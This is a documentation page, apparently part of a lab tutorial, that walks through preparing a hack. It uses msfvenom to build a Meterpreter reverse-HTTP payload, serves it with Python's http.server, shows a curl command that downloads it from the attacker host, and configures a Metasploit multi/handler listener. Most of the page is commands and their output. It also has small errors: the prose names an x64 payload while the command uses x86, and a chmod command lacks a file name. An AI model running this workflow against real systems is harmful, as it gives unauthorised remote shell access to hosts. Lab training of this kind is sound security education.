---
id: prepare_hack
title: Preparing the hack
sidebar_label: Preparation
---

In order to hack the system, we first need to generate a payload that will allow us to get a reverse shell on the target host.
Since the host we will be targetting is an amd64 system, we need to use the linux/x64/meterpreter_reverse_http payload.
We also need to configure the payload with the address it will need to connect back to, to establish the reverse shell, in this case kali.container.shipyard.run and port 9999.

We can do this by running `msfvenom` with our payload, the host and port we will be listening on, and the format we want the payload to be in.

```shell
┌──(root💀kali)-[/]
└─$ msfvenom -p linux/x86/meterpreter_reverse_http LHOST="kali.container.shipyard.run" LPORT="9999" -f elf > payload

[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 1097244 bytes
Final size of elf file: 1097244 bytes
```

Lets double check that the payload is correctly generated, by making it executable and running it.

```shell
┌──(root💀kali)-[/]
└─$ chmod +x
```

```shell
┌──(root💀kali)-[/]
└─$ ./payload

^C
```

We should not see any output. But no errors mean it will run correctly.  
Exit out of the process with CTRL+C.

In order for our target to be able to execute the payload, we need to host it somewhere where it can be downloaded.
An easy way to serve files is by using the Python3 http.server module.

```shell
┌──(root💀kali)-[/]
└─$ python3 -m http.server &> /dev/null &

[1] 1556
```

By default it serves all the files in the current directory on port 8000.
If we wanted to download the payload file somewhere, we can do so by browsing to `http://kali.container.shipyard.run:8000/payload`.

```shell
curl http://kali.container.shipyard.run:8000/payload -o payload
```

Now that we have a payload and it is hosted somewhere, we need to start a listener to receive the incoming connections. We will be using meterpreter to do this.

Lets start the metasploit framework console.

```shell
┌──(root💀kali)-[/]
└─$ msfconsole

[*] Starting the Metasploit Framework console.../
[%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $a,        |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
[%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $S`?a,     |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
[%%%%%%%%%%%%%%%%%%%%__%%%%%%%%%%|       `?a, |%%%%%%%%__%%%%%%%%%__%%__ %%%%]
[% .--------..-----.|  |_ .---.-.|       .,a$%|.-----.|  |.-----.|__||  |_ %%]
[% |        ||  -__||   _||  _  ||  ,,aS$""`  ||  _  ||  ||  _  ||  ||   _|%%]
[% |__|__|__||_____||____||___._||%$P"`       ||   __||__||_____||__||____|%%]
[%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| `"a,       ||__|%%%%%%%%%%%%%%%%%%%%%%%%%%]
[%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%|____`"a,$$__|%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
[%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%        `"$   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
[%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]


       =[ metasploit v6.0.15-dev                          ]
+ -- --=[ 2071 exploits - 1123 auxiliary - 352 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: Tired of setting RHOSTS for modules? Try globally setting it with setg RHOSTS x.x.x.x

msf6 >
```

Now that we are in the Metasploit console, lets verify that everything is running correctly.

```shell
msf6 > db_status

[*] Connected to msf. Connection type: postgresql.
```

Launch the multi/handler, which is a stub that handles exploits launched outside of the framework.

```shell
msf6 > use "exploit/multi/handler"

[*] Using configured payload generic/shell_reverse_tcp
```

Now we need to set some parameters before we start our local listener.  
We need to set the payload we want to use.

```shell
msf6 exploit(multi/handler) > set PAYLOAD linux/x86/meterpreter_reverse_http

PAYLOAD => linux/x86/meterpreter_reverse_http
```

The address we want to have our reverse handler listening on.

```shell
msf6 exploit(multi/handler) > set LHOST kali.container.shipyard.run

LHOST => kali.container.shipyard.run
```

And the port the reverse handler should listen on.

```shell
msf6 exploit(multi/handler) > set LPORT 9999

LPORT => 9999
```

We can then start the reverse handler.

```shell
msf6 exploit(multi/handler) > run

[*] Started HTTP reverse handler on http://10.5.0.2:9999
```

Now that we have the reverse handler running, we can execute the hack on the remote system.
